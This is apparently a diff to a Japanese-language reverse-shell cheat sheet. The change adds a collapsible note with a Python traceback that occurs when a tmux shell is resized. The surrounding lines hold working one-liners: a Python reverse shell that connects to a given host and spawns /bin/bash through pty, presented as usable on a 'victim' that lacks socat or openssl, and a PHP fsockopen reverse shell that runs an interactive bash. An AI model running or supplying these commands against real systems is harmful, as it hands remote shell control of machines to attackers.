@@ -92,6 +92,22 @@ socatもopensslもない状況のvictimでもpythonさえあればOK
 python -c 'import sys;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],int(sys.argv[2])));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' localhost 8080
 ```
 
+<details>
+<summary>tmuxでshellの画面をresizeすると下記のようなエラーが発生する</summary>
+<!-- you must insert blank line -->
+```
+Traceback (most recent call last):
+                                      File "<string>", line 1, in <module>
+                                                                            File "/usr/lib/python2.7/pty.py", line 175, in spawn
+                                                                                                                                    _copy(master_fd, master_read, stdin_read)
+                                       File "/usr/lib/python2.7/pty.py", line 147, in _copy
+                                                                                               rfds, wfds, xfds = select(fds, [], [])
+                                                                                                                                     select.error: (4, 'Interrupted system call')
+```
+</details>
+
+
+
 ``` bash
 php -r '$sock=fsockopen($argv[1],intval($argv[2]));exec("/bin/bash -i <&3 >&3 2>&3");' 127.0.0.1 8080
 ```
